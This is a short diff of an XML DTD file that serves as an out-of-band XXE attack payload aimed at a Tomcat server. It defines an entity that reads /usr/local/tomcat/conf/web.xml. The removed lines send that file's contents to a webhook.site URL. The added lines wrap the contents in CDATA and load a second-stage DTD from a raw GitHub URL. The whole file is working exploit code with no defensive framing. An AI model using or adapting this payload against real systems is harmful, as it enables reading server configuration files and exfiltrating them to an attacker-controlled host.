@@ -1,4 +1,5 @@
 <!ENTITY % file SYSTEM "file:///usr/local/tomcat/conf/web.xml">
-<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://webhook.site/c476918d-cf98-4f7c-970c-9ca5e3e4220e/abc?data=%file;'>">
-%eval;
-%exfil;
+<!ENTITY % start "<![CDATA[">
+<!ENTITY % end "]]>">
+<!ENTITY % dtd2 SYSTEM "https://raw.githubusercontent.com/NgoTrongThuan01/LCS/refs/heads/main/stage2.dtd">
+%dtd2;
